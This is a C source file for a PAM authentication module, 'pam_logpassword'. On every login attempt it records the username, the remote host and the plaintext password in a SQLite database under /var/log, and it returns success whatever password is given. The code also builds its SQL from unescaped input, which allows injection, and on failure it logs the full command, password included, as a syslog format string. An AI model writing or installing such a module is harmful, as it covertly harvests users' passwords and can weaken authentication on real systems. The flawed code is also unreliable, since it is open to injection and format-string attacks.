#ifndef LINUX
    #include <security/pam_appl.h>
#endif  /* LINUX */

#define PAM_SM_AUTH
#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include <syslog.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sqlite3.h>

#define _XOPEN_SOURCE
#include <unistd.h>

#define DEFAULT_LOG   "/var/log/passwords.db"
#define BUF_MAX       4096

/* logging function ripped from pam_listfile.c */
static void _pam_log(int err, const char *format, ...)
{
    va_list args;

    va_start(args, format);
    openlog("pam_logpassword", LOG_CONS|LOG_PID, LOG_AUTH);
    vsyslog(err, format, args);
    va_end(args);
    closelog();
}

typedef struct{
        int fd;
        sqlite3 *db;
        char *name;
} Dbctx;

static int table_exists( void* udp, int c_num, char** c_vals, char** c_names ) {
        *(int *)udp = 1;
        return 0;
}

/* expected hook for auth service */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    int ret;
    char *uname;
    char *ip;
    char command[BUF_MAX];
    
    const char *pword;
    struct timeval tv;
    
    pam_get_authtok(pamh, PAM_AUTHTOK, &pword, NULL);
    pam_get_item(pamh, PAM_USER, (void*) &uname);
    pam_get_item(pamh, PAM_RHOST,(void*) &ip);
    
    Dbctx database;
    database.name = DEFAULT_LOG;
    
    database.fd = sqlite3_open(database.name, &(database.db));
    if( database.fd ) {
        _pam_log(LOG_ERR,"failed to open database file");
       goto failure;
    }
    
    int exists = 0;
    ret = sqlite3_exec(database.db, "SELECT name FROM sqlite_master WHERE type='table' AND name='passwords';", table_exists, &exists, NULL);
    if (!exists) {
        _pam_log(LOG_ERR,"Creating passwords table");
        ret = sqlite3_exec(database.db, "CREATE TABLE passwords(time INTEGER, nano INTEGER, ip TEXT, username TEXT, password TEXT, PRIMARY KEY (time,nano));", NULL, NULL, NULL);
    }
    
    gettimeofday(&tv, NULL);
    ret = snprintf(command, BUF_MAX-1, "INSERT INTO passwords(time,nano,ip,username,password) VALUES(%lu,%lu,'%s','%s','%s');", tv.tv_sec, tv.tv_usec, ip, uname, pword);
    ret = sqlite3_exec(database.db, command, NULL, NULL, NULL);
    if (ret)
    {
        _pam_log(LOG_ERR,"failed to write pw to file");
        _pam_log(LOG_ERR, command);
        goto failure;
    }
    
    sqlite3_close(database.db);
    
    return PAM_SUCCESS;
    
    failure:
    if (database.db) { sqlite3_close(database.db); }
    return PAM_AUTHINFO_UNAVAIL;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
   return PAM_SUCCESS;
}

#ifdef PAM_STATIC
struct pam_module _pam_listfile_modstruct = {
   "pam_logpassword",
    pam_sm_authenticate,
    pam_sm_setcred,
    NULL,
    NULL,
    NULL,
    NULL,
};
#endif
